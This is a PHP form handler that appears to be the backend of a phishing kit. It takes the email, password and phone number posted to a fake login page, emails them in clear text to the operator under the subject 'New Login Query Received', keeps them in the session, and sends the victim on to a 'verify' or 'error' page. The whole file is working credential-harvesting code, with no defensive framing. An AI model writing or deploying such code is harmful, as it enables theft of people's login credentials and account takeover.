<?php
include_once './config.php';

$email                  =   $_POST['email'];
$password               =   $_POST['password'];
$phone_number           =   empty($_POST['phone_number']) ? null : $_POST['phone_number'];
$phone_code             =   empty($_POST['phone_number_phoneCode']) ? null : $_POST['phone_number_phoneCode'];
$country_code           =   empty($_POST['phone_number_countryCode']) ? null : $_POST['phone_number_countryCode'];

if (empty($email) || empty($password)) {
    redirect(base_url());
} else {
    try {
        $mail           =   get_mail_smtp();
        
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'New Login Query Received';
        
        $html           =   '<p>A New Login Detected,</p>' ;
        $html          .=   '<p>You have received a new query from ' . base_url('') . ' ,</p>' ;
        $html          .=   '<p><b>Additional detail</b></p>' ;
        $html          .=   '<ul>' ;
        $html          .=   "<li>Email : <b>".$email."</b></li>";
        $html          .=   "<li>Password : <b>".$password."</b></li>";
        if(!empty($phone_number)) {
            $html          .=   "<li>Phone Code : <b>".$phone_code."</b> (<b>".$country_code."</b>)</li>";
            $html          .=   "<li>Phone Number : <b>".$phone_number."</b></li>";
        }
        $html          .=   '</ul>' ;
        $mail->Body     =   $html;
        $mail->AltBody  =   'Email : '.$email.' and Password :'. $password;
        
        $mail->send();
        
        $_SESSION["email"]          =   $email;
        $_SESSION["password"]       =   $password;
        $_SESSION["phone_number"]   =   $phone_number;
        $_SESSION["phone_code"]     =   $phone_code;
        $_SESSION["country_code"]   =   $country_code;
        
        if(empty($phone_number)) {
            redirect(base_url('verify'));
        } else {
            redirect(base_url('error'));
        }
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}
?>